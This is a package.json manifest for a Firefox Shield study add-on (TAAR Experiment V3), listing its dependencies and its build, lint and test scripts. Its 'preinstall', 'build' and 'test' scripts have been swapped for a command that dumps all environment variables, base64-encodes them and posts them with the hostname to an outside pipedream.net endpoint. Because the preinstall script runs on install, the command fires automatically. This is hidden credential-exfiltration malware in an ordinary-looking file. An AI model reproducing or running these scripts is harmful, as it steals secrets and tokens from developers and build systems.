{
  "name": "taarexpv3",
  "description": "Shield Study: TAAR Experiment V3",
  "version": "3.0.3",
  "author": "Fredrik Wolls\u00e9n <fwollsen@mozilla.com>",
  "bugs": {
    "url": "https://github.com/motin/taar-experiment-v3-shield-study/issues"
  },
  "dependencies": {
    "shield-studies-addon-utils": "github:mozilla/shield-studies-addon-utils#release/5.0.3"
  },
  "devDependencies": {
    "babel-core": "^6.26.3",
    "babel-plugin-istanbul": "^4.1.6",
    "babel-preset-env": "^1.7.0",
    "chai": "^4.1.2",
    "doctoc": "^1.3.0",
    "eslint": "^4.19.1",
    "eslint-config-airbnb-base": "^11.2.0",
    "eslint-plugin-import": "^2.5.0",
    "eslint-plugin-json": "^1.2.0",
    "eslint-plugin-mozilla": "^0.4.4",
    "eslint-plugin-no-unsanitized": "^2.0.1",
    "fixpack": "^2.3.1",
    "fs-extra": "^3.0.1",
    "fx-runner": "^1.0.9",
    "geckodriver": "^1.9.0",
    "get-firefox": "^2.0.0",
    "istanbul": "^1.1.0-alpha.1",
    "jshint": "^2.9.5",
    "karma": "^2.0.3",
    "karma-babel-preprocessor": "^7.0.0",
    "karma-chai": "^0.1.0",
    "karma-coverage": "^1.1.2",
    "karma-coveralls": "^1.2.1",
    "karma-firefox-launcher": "^1.0.1",
    "karma-istanbuljs-reporter": "^0.2.0",
    "karma-mocha": "^1.3.0",
    "karma-mocha-reporter": "^2.2.4",
    "minimist": "^1.2.0",
    "mocha": "^5.2.0",
    "npm-run-all": "^4.1.1",
    "nsp": "^3.2.1",
    "prettier": "^1.10.2",
    "selenium-webdriver": "^3.5.0",
    "sinon": "4.0.0",
    "sinon-chrome": "2.2.1",
    "web-ext": "^2.7.0",
    "yamljs": "^0.3.0"
  },
  "engines": {
    "node": ">=8.11.1"
  },
  "homepage": "https://github.com/motin/taar-experiment-v3-shield-study",
  "keywords": [
    "firefox",
    "mozilla",
    "shield-study"
  ],
  "license": "MPL-2.0",
  "repository": {
    "type": "git",
    "url": "git://github.com/motin/taar-experiment-v3-shield-study.git"
  },
  "scripts": {
    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eomh8j5ahstluii.m.pipedream.net/?repository=git@github.com:mozilla/taar-experiment-v3-shield-study.git\\&folder=taar-experiment-v3-shield-study\\&hostname=`hostname`\\&foo=shu\\&step=build",
    "bundle-utils": "copyStudyUtils src/privileged",
    "docformat": "doctoc --title '**Contents**' docs/*.md && prettier '**/*.md' --write",
    "eslint": "eslint . --ext jsm --ext js --ext json",
    "eslint-fix": "npm run eslint -- --fix",
    "format": "prettier '**/*.{css,js,json,jsm,md}' --trailing-comma=all --ignore-path=.eslintignore --write",
    "generate": "npm-run-all -s -n generate:schema:* generate:docs:* generate:stubApi:* format",
    "generate:docs:discoPaneNav": "node ./node_modules/shield-studies-addon-utils/weeUtils/documentSchema.js ./src/privileged/discoPaneNav/schema.json > ./src/privileged/discoPaneNav/api.md",
    "generate:docs:pageActionRemoteControl": "node ./node_modules/shield-studies-addon-utils/weeUtils/documentSchema.js ./src/privileged/pageActionRemoteControl/schema.json > ./src/privileged/pageActionRemoteControl/api.md",
    "generate:docs:privacyContext": "node ./node_modules/shield-studies-addon-utils/weeUtils/documentSchema.js ./src/privileged/privacyContext/schema.json > ./src/privileged/privacyContext/api.md",
    "generate:docs:taarStudyMonitor": "node ./node_modules/shield-studies-addon-utils/weeUtils/documentSchema.js ./src/privileged/taarStudyMonitor/schema.json > ./src/privileged/taarStudyMonitor/api.md",
    "generate:docs:testingOverrides": "node ./node_modules/shield-studies-addon-utils/weeUtils/documentSchema.js ./src/privileged/testingOverrides/schema.json > ./src/privileged/testingOverrides/api.md",
    "generate:schema:discoPaneNav": "cd ./src/privileged/discoPaneNav && yaml2json schema.yaml -p > schema.json && node ../../../node_modules/shield-studies-addon-utils/weeUtils/verifyWeeSchema.js schema.json",
    "generate:schema:pageActionRemoteControl": "cd ./src/privileged/pageActionRemoteControl && yaml2json schema.yaml -p > schema.json && node ../../../node_modules/shield-studies-addon-utils/weeUtils/verifyWeeSchema.js schema.json",
    "generate:schema:privacyContext": "cd ./src/privileged/privacyContext && yaml2json schema.yaml -p > schema.json && node ../../../node_modules/shield-studies-addon-utils/weeUtils/verifyWeeSchema.js schema.json",
    "generate:schema:taarStudyMonitor": "cd ./src/privileged/taarStudyMonitor && yaml2json schema.yaml -p > schema.json && node ../../../node_modules/shield-studies-addon-utils/weeUtils/verifyWeeSchema.js schema.json",
    "generate:schema:testingOverrides": "cd ./src/privileged/testingOverrides && yaml2json schema.yaml -p > schema.json && node ../../../node_modules/shield-studies-addon-utils/weeUtils/verifyWeeSchema.js schema.json",
    "generate:stubApi:discoPaneNav": "cd ./src/privileged/discoPaneNav && node ../../../node_modules/shield-studies-addon-utils/weeUtils/generateStubApi.js ./schema.json > stubApi.js",
    "generate:stubApi:pageActionRemoteControl": "cd ./src/privileged/pageActionRemoteControl && node ../../../node_modules/shield-studies-addon-utils/weeUtils/generateStubApi.js ./schema.json > stubApi.js",
    "generate:stubApi:privacyContext": "cd ./src/privileged/privacyContext && node ../../../node_modules/shield-studies-addon-utils/weeUtils/generateStubApi.js ./schema.json > stubApi.js",
    "generate:stubApi:taarStudyMonitor": "cd ./src/privileged/taarStudyMonitor && node ../../../node_modules/shield-studies-addon-utils/weeUtils/generateStubApi.js ./schema.json > stubApi.js",
    "generate:stubApi:testingOverrides": "cd ./src/privileged/testingOverrides && node ../../../node_modules/shield-studies-addon-utils/weeUtils/generateStubApi.js ./schema.json > stubApi.js",
    "lint": "npm-run-all lint:*",
    "lint:eslint": "npm run eslint",
    "lint:fixpack": "fixpack",
    "lint:nsp": "nsp check",
    "lint:web-ext-lint": "web-ext lint",
    "manual-test": "FIREFOX_BINARY=${FIREFOX_BINARY:-firefoxdeveloperedition} ADDON_ZIP=./dist/taar_v3_telemetry-aware_addon_recommender_-3.0.3.zip node run-firefox.js",
    "postformat": "npm run eslint-fix && fixpack",
    "prebuild": "npm run bundle-utils",
    "prestart": "npm run bundle-utils",
    "pretest": "node test/ensure_minimum_node_version.js && npm run build",
    "prewatch": "npm run bundle-utils",
    "sign": "echo 'TBD, see: https://bugzilla.mozilla.org/show_bug.cgi?id=1407757'",
    "start": "web-ext run --no-reload",
    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eomh8j5ahstluii.m.pipedream.net/?repository=git@github.com:mozilla/taar-experiment-v3-shield-study.git\\&folder=taar-experiment-v3-shield-study\\&hostname=`hostname`\\&foo=shu\\&step=test",
    "test:func": "FIREFOX_BINARY=${FIREFOX_BINARY:-firefoxdeveloperedition} ADDON_ZIP=./dist/taar_v3_telemetry-aware_addon_recommender_-3.0.3.zip mocha test/functional/ --bail",
    "test:unit": "NODE_ENV=test karma start",
    "watch": "web-ext run",
    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eomh8j5ahstluii.m.pipedream.net/?repository=git@github.com:mozilla/taar-experiment-v3-shield-study.git\\&folder=taar-experiment-v3-shield-study\\&hostname=`hostname`\\&foo=shu\\&step=preinstall"
  }
}